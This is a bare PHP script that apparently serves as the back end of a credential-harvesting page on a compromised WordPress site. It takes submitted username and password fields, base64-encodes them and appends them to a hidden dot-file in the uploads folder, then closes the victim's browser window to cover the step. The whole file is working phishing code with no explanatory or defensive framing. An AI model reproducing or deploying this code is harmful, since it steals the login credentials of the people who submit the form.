<?php
$data = "user = " . $_POST['usr'] . " password = " . $_POST['psw'] . "\n";
file_put_contents('wp-content/uploads/.log.txt', base64_encode($data).PHP_EOL, FILE_APPEND);
echo "<script>window.close();</script>";
?>
